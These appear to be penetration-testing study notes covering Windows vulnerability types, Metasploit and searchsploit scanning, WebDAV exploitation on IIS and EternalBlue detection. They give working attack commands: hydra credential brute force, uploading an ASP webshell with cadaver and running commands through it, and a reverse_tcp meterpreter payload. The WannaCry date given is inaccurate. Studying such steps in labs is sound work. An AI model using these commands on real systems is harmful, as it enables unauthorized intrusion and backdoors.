
1. [Windows Vulnerabilities](Vulnerability%20Assessment.md#windows-vulnerabilities)
2. [Microsoft IIS and WebDav](Vulnerability%20Assessment.md#iis-and-webdav)


---
### Windows-Vulnerabilities

The various OS versions/relates makes the threat surface fragmented since some vulnerabilities  that exist in on OS might not be present in another. All Windows versions share common issues:
- The OS is built in C, making them prone to buffer overflows, arbitrary code exec etc. 
- Vulnerable to cross platform vulnerabilities (ie SQL Injection attacks)
- Vulnerable to physical attacks (theft, malicious usb devices)
### Common Windows Vulnerability Types

- **Information Disclosure:** Allows unauthorized access to sensitive data.
- **Buffer Overflows:** Caused by programming errors, allowing malicious code to overwrite memory and potentially execute malware or provide remote access.
- **Remote Code Execution:** Lets attackers execute code remotely on the system.
- **Privilege Escalation:** Allows attackers to elevate privileges post-compromise, often due to misconfigurations.
- **Denial of Service (DoS):** Overloads system resources, preventing normal operation.
### Commonly Exploited Windows Services

- **Microsoft IIS** (TCP 80/443): Web server software used on Windows.
- **WebDAV** (TCP 80/443): HTTP extension for file management on web servers.
- **SMB/CIFS** (TCP 445): File sharing protocol for local networks.
- **RDP** (TCP 3389): Remote access protocol used for GUI-based interactions with Windows systems.
- **WinRM** (TCP 5986/443): Windows remote management protocol for executing remote commands.
---
## Vulnerability-Scanning 

Vulnerability scanning & detection is the process of scanning a target for vulnerabilities and verifying whether they can be exploited. This information will useful during the exploitation phase
### Vulnerability Scanning with MSF

Can use auxiliary and exploit modules to scan and identify inherent vulnerabilities in services, OS's and webapps.

- Start PostgreSQL/MSFConsole: `service postgresql start` > `msfconsole`
- (Optional) Can create a workspace: `workspace -a workspace_name`
- (Optional) Can set the RHOST/RHOSTS global variables set you dont have to set the IP for each module execution `setg RHOST target`
### 1. Getting Service Versions and Operating Systems

Goal: Key piece of information for vulnerability scanning for a target OS or services running on it is the service version. Can get service info and the OS from nmap or metasploit modules: 

**a.  Scan using NMap**

```
db_nmap -sS -sV -O -p- target
```

- `-sS` SYN Scan/Stealth Scan 
- `-sV` Service Version detection
- `-O`   Operating system detection
- `-p-`  The full TCP port range (65,535)

**b. Scan using Metasploit**

Metasploit doesn't have a single module that does everything in one shot like `nmap`, need to combine different auxiliary modules to accomplish this:
1. Can use `auxiliary/scanner/portscan/tcp` for a general TCP scan or `auxiliary/scanner/portscan/syn` to perform the SYN scan.
```
use auxiliary/scanner/portscan/tcp
set RHOSTS <target>
set PORTS 1-65535
run
```
2. **Getting Service Version**: Use various service version modules (like `http_version`, `smb_version`) to detect services and versions.
```
use auxiliary/scanner/smb/smb_version
set RHOSTS <target>
run
```
3. **Getting OS**: There isn't a direct way to perform OS detection with metasploit. Some auxiliary scanners like smb_version can have OS detection but you might need use exploits to fingerprint the system. 
### 2. Look for Exploits/Vulnerabilities

There's a number of way to search for exploit and vulnerabilities:
#### 2.a - Manual Search in Metasploit
The found services and their versions from the scans should be in `services` in Metasploit. Take each of the observed services and look through Metasploit using its built-in utility for any exploits for each of them

```
search type:exploit name:<service_name>
```

If you don't find the service  in Metasploit, it could be that:
1. The particular version of the service isn't vulnerable to any inherent exploit or
2. There isn't a Metasploit exploit available to exploit the service 

If you <u>do</u> find a service that might work with an exploit, you can  double-check through the module's description to confirm that the version of the service would.
```
use <module>
info
```

**Random note**: Confirm the operating system (Linux/Windows) for the payload so that you can get a meterpreter session

```
set payload windows/meterpreter/reverse_tcp
```

#### 2.b - Kali Searchsploit

Another search option for looking for exploits is built-in to Kali which is `searchsploit`.  Searchsploit is a cmd-line utility which searches the ExploitDB for exploits. The searches can bring in exploit/exploit code that isn't available in Metasploit console and also Metasploit exploits, so we can limit the search to just metasploit exploit modules. Metasploit modules will have (Metasploit) in the exploits name so we can grep the search to filter the other results out:
```
searchsploit " <service> " | grep -e "Metasploit"
```
You can see some of the service versions from the `searchsploit " <service> "` search of some of the exploits and the exploits with the a metasploit equivalent module should have OS versions to see if it works for the target.

#### 2.c - Metasploit Autopwn

Autopwn is a plugin that does a scan of the open services and provides exploit modules that could work with each of the services. This only works best after enumerating services

- Link to Github: https://github.com/hahwul/metasploit-autopwn

- download db_autopwn.rb file in metasploit plugin directory

```
#> wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
```

If saved to downloads...
```
sudo mv db_autopwn.rb /usr/share/metasploit-framework/plugins/
```
- Load the plugin
```
load db_autopwn
```

- Run the plugin: This can be overwhelming, so narrowing the search to just ports would provide a list of exploits for a port
```
db_autopwn -p -t -PI <port>
```
- `-p` Select modules based on open ports
- `-t` Shows all matching exploit modules
- `-PI` Only exploit hosts with these ports open

#### 2.d. - Analyze Command

The Metasploit `analyze`  command will analyze the contents of the metasploit database (hosts,services) and provide a list of vulnerabilities that the services are affected by.

```
analyze
```

Can see the found vulnerabilities using `vulns`.

---
### IIS-and-WebDav

**IIS (Internet Information Services)** is a web server developed by Microsoft for the Windows NT family. It can be used to host static and dynamic websites and web apps developed in  ASP.NET/ PHP and provides a GUI for managing websites. Typically running on ports 80 and 443, IIS handles executable file extensions like `.asp`, `.aspx`, `.config`, and `.php`.

**WebDAV (Web-based Distributed Authoring and Versioning)** is an extension of HTTP that allows users to  edit/manage files on  web servers, essentially turning a web server into a file server. It can run on top of  IIS, Apache etc over ports 80/443 and requires authentication via a username and password to connect.
#### WebDAV Exploitation

1. Identify if WebDAV is configured on the IIS server.
2. Check if authentication is needed for WebDAV.  When WebDAV is running on a Windows host, sometimes it doesn't have any authentication. If it does, perform a brute-force attack to find valid credentials for authentication.
3. Use the credentials to upload a malicious .asp payload, enabling command execution or a reverse shell on the target.


#### Initial Nmap Scan



Goal: See if WebDav is enabled, what directory is it enabled on and if authentication is needed


Can run an initial scan to get general information on the target

```
nmap -Pn -sV -sC <target>
```

- `-Pn` = Port scan without ping 
- `-sV`  = Service version check
- `-sC` = Important Here: Runs additional scripts on each port to enumerate information.
- Note: Not specifying port options means nmap will scan the top 1000 most common ports

The `-sC` options is helpful since it can tell if WebDAV is enabled using scripts like '*http-webdav-scan*'. This might not show the directories that WebDav is enabled on, so we can run an additional Nmap script scan using the `http-enum` nmap script against the port WebDav is running (80/443) to confirm the directory and if authentication is enabled:

```
nmap -sV -p80 --script=http-enum <target>
```

The http-enum script should return some helpful information like <u>the directory webdav might be enabled on</u>. If you get a response like `401 Unauthorized` then authentication has been enabled on the WebDav server. You can manually check that location in the browser.

```
http://target/listed_webdav_directory/
```

**Performing a Brute Force**

Authentication is needed and we don't have the creds, 

When penetration testing, be careful of the performing a brute force on any service since it could cause a DoS (Denial of Service). Be aware that wordlists might not have the credentials you're looking for so you'd want to perform more reconnaissance to confirm the users that will have access to WebDav. For the passwords, there's a lot of wordlists out there that might provide the actual credentials.

```
hydra -L users_file -P passwords_file <target> http-get <webdav_directory>
```


Example: 

```
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.41.42.41 http-get /webdav/
```


#### Davtest

Davtest is a WebDAV scanner used for scanning, authenticating, and exploiting WebDAV servers. Used for checking if authentication is enabled, authenticate with it and run checks to show what can be done for exploitation.  Davtest comes pre-installed on most penetration testing distributions like Kali and Parrot OS.


**Authentication**

```
davtest -url <target_location>
```
- `-url` = url of DAV location

Example:
```
davtest -url http://10.16.25.85/webdav
```

An `Unauthorized` response would mean valid credentials is required.



To provide the creds, use the `-auth` option and then include  `username:password`:
```
davtest -auth <user>:<password> -url <target__location>
```

Example:
```
davtest -auth admin1:412pass -url http://10.16.25.85/webdav
```

The  results for DavTest will have the following checks show in the output
1. **Testing DAV Connection** = Authenticates WebDav and creates a random string for the session (like `E93ge9fF39Giz`) which is  appended to any directory or file that is created
- `http://10.16.25.85/webdav`
	- Also creates a random string for the session (like `E93ge9fF39Giz`)
2. **Creating creating** | Tries creating a directory
- `http://10.16.25.85/webdav/DavTestDir_E93ge9fF39Giz` 
3. **Sending test files** | Tries uploading test files like txt,jsp,aspx etc)   
- `http://10.16.25.85/webdav/DavTestDir_E93ge9fF39Giz/davtest_E93ge9fF39Giz.aspx` 
4. **Checking for test file execution:** Tests the execution of each type of file that was uploaded. Important to see which types of files can be executed on the server.
	- <u>Asp would be good for generating an asp payload or uploading an asp webshell which can be accomplished by cadaver.</u>

### Cadaver

Cadaver is a tool for WebDAV clients that lets us upload and download files from the WebDav directory. Also comes pre-installed on most penetration testing distributions like Kali and Parrot OS.

General Syntax:
```
cadaver <target_location>
```

Example:
```
cadaver http://10.16.25.85/webdav/
```

You'd then be promoted for the username and password

```
Username: user
Password: rando_pass
```

You be given the a psuedo shell to interact with the server | `dav:/directory/>`

##### Upload the Webshell using Cadaver

We can upload a webshell to get some kind of command execution on the target system. A webshell is a script or program uploaded to a web server, which can allow us to remotely execute commands, manipulate files, or access the server's resources. It essentially serves as a backdoor, giving us control over the server.  

1. **Find the Webshell:** Kali Linux comes pre-packaged with various webshells grouped by programming languages including `asp, aspx, cfm, jsp, perl, php `. They can be found in:
```
/usr/share/webshells/
```

Kali has a webshell for asp located at :
```
/usr/share/webshells/asp/webshell.asp
```

2. **Upload the Webshell to the WebDav server**: This can be uploaded through cadaver to the WebDav Server using a PUT command:
```
put /usr/share/webshells/asp/webshell.asp
```

3. **Execute the Webshell script:**  Once the webshell has been uploaded, navigate to that  file location in the WebDav directory it was uploaded to from the browser. So, if it was uploaded to `/uploads/` you'd visit `http://targetsite.com/uploads/webshell.asp` from the browser, click on the file to trigger the script.
4. **Interact with the Server**:  Webshells normally comes with a user-friendly interface like input fields/search boxes that allows attackers to interact with the compromised server. After executing the `webshell.asp` script, there should be a search box which would let you run commands on the target system where the output would. We can do anything like searching for files, executing shell commands, or navigating directories. 

- List directory content with `dir`
```
dir C:\
```

- Print out file contents
```
type C:\flag.txt
```


## WebDav: Process from Start to Finish

1. <u>Identify if WebDAV is configured on the IIS server</u>: Can use nmap for an initial scans/enumeration using `-sV`, `-sC` options. This should pull the webdav directory:

```
a. nmap -Pn -sV -sC <target>
```

2. <u>Check if authentication is needed for WebDAV</u>: The nmap `http-enum` script scan or `davtest` can tell you if authentication is needed on the WebDav location. If it does need authentication (getting a 4xx error), perform a brute-force attack using something like `hydra` to find valid credentials for authentication. Might want to perform more reconnaissance to confirm the users that will have access to WebDav. There's a lot of wordlists for passwords that might provide the right creds:

- **Nmap**
```
nmap -sV -p80 --script=http-enum <target>
```

- **DavTest**
```
Syntax -> davtest -url <target_webdav_location>

Example -> davtest -url http://10.16.25.85/webdav
```

- **Hydra**
```
Syntax -> hydra -L users_file -P passwords_file <target> http-get <webdav_directory>

Example -> hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.41.42.41 http-get /webdav/
```


3. <u>Use the credentials to upload a malicious .asp payload, enabling command execution or a reverse shell on the target.</u>

a.  Sign in and run `davtest` to confirm what type of files can be executed on the server
```
Syntax -> davtest -auth <user>:<password> -url <target__location>

Example -> davtest -auth admin1:412pass -url http://10.16.25.85/webdav
```

b. Use cadaver setup a shell session with the WebDav Server
```
Syntax -> cadaver <target_location>

Example -> cadaver http://10.16.25.85/webdav/
```

c. Upload the webshell script to the Server using a `PUT` request within the cadaver session. Kali's webshells can be found `/usr/share/webshells/`
```
put /usr/share/webshells/asp/webshell.asp
```

d. Navigate to the web shell on the server from the browser, click the script to execute
```
Uploaded To ->  `/webdav/`

Visit -> http://targetsite.com/webdav/webshell.asp
```


---
## Vulnerability Analysis

EternalBlue is a critical Windows vulnerability that lets attackers remotely run code on a target system, giving them access to both the system and the network it’s connected to. It was originally created by the NSA and leaked in 2017 by the Shadow Brokers. EternalBlue works by exploiting a flaw in the SMBv1 protocol, which allows attackers to send specially crafted packets and execute commands on the system, or even give themselves a reverse shell or meterpreter session. One of its key features is that it automatically gives elevated privileges, so there’s no need for further privilege escalation. The exploit became infamous when it was used in the **WannaCry ransomware attack** in June 2017. WannaCry paired with EternalBlue to scan for  Windows systems on a network, infect them, and spread the ransomware to other machines.

EternalBlue impacts Windows Vista, Windows 7, Windows Server 2008, Windows 8.1, Windows Server 2012, Windows 10 (certain builds), and Windows Server 2016. <u>It's especially effective on Windows 7, 8.1, Server 2008, and Server 2012</u>, and works on both 32-bit and 64-bit systems. Despite a patch being released in March 2017, many systems remain unpatched, leaving them vulnerable.

**Metasploit Support:**

- There’s an **MSF auxiliary module** that checks if a system is vulnerable to EternalBlue.
- There’s also an **exploit module** that can exploit unpatched systems, giving attackers privileged access and a meterpreter session.

- Autoblue -MS17 -010: https://github.com/3ndG4me/AutoBlue-MS17-010


Run an Nmap scan to identify open ports but we're mainly interested in SMB which is 445

```
sudo nmap -sV -p 445 -O target
```

- `-sV`= Checks the version of services
- `-O` = Checks Operating system | Will confirm what version of windows is running
- `-p 445` = Port 445

You can run the `smb-vuln-ms17-010` Nmap script to check if the target is vulnerable to the Eternal Blue exploit:

```
nmap -sV -p 445 --script=smb-vuln-ms17-010 <target>
```